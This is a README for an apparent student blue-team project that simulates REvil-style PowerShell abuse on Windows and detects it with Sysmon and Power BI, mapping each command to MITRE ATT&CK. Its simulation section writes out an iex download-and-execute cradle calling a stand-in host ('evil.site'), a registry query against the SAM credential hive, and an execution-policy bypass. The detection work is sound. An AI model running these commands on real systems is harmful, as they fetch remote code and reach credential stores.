# Windows Threat Hunter
![PowerShell](https://img.shields.io/badge/script-powershell-blue)
![Sysmon](https://img.shields.io/badge/tool-sysmon-red)
![MITRE ATT&CK](https://img.shields.io/badge/mapping-mitre-orange)
![Power BI](https://img.shields.io/badge/visualisation-powerbi-yellow)

A mini threat detection and analysis project inspired by the 2021 **JBS ransomware attack**.  
This blue team simulation demonstrates how adversaries abuse PowerShell, perform credential access, and retrieve payloads — and how we can detect them with **Sysmon**, **PowerShell scripting**, and **Power BI dashboards**.

---

## Why I Made This

This project was created as part of my research into attack detection tools commonly used in the industry. My goal was to simulate attacker-like behaviour based on a **real-world ransomware case (REvil)**, extract logs with **custom scripting**, map detections to the **MITRE ATT&CK framework**, and demonstrate everything visually in **Power BI**.

---

## Real-World Case Study: The JBS Ransomware Attack

In May 2021, the world's largest meat supplier, **JBS**, was targeted by the REvil ransomware group. The attack disrupted meat production across North America and Australia, leading to an $11 million ransom payout. It involved:
- Use of credential access tools and remote payload delivery
- File encryption and operational shutdowns
- Abuse of PowerShell for lateral movement and data exfiltration

> 🔗 Sources: [Wired](https://www.wired.com/story/jbs-ransomware-attack-underscores-dire-threat), [Claroty](https://claroty.com/blog/jbs-attack-puts-food-and-beverage-cybersecurity-to-the-test), [InvestigateMidwest](https://investigatemidwest.org/2023/06/08/jbss-cybersecurity-was-unusually-poor-prior-to-2021-ransomware-attack-internal-homeland-security-records-show)

---

## MITRE ATT&CK Mapping

| PowerShell Command | Technique | MITRE ID | Tactic |
|--------------------|-----------|----------|--------|
| `Invoke-WebRequest` | Ingress Tool Transfer | T1105 | Command & Control |
| `New-Object Net.WebClient` | Command Execution | T1059 | Execution |
| `reg query HKLM\SAM` | OS Credential Dumping | T1003 | Credential Access |

---

## Tools Used

- **Sysmon** – Logs process creation, network, and file events  
- **PowerShell** – Scripting to parse and export logs  
- **Power BI** – Dashboard visualisation of IOC activity  
- **Visual Studio Code** – Script and site editing  
- **GitHub Pages** – Deployed as a public demo site

---

## Project Structure

windows-threat-hunter/

├── ioc-finder.ps1 # Script to extract relevant Sysmon events

├── sysmonconfig.xml # Monitoring configuration (SwiftOnSecurity)

├── ioc_events.csv # Exported event data (from script)

├── index.html # Website demo landing page

├── style.css # Simple site styling

├── screenshots/

│ └── powerbi.png # Dashboard screenshot

└── README.md

# Simulate payload download
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\Public\PSTools.zip"

# Simulate credential access
reg query HKLM\SAM

# Simulate script execution (will fail but still log)
iex(New-Object Net.WebClient).DownloadString('http://evil.site/script.ps1')

# Extract logs with Script
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\ioc-finder.ps1
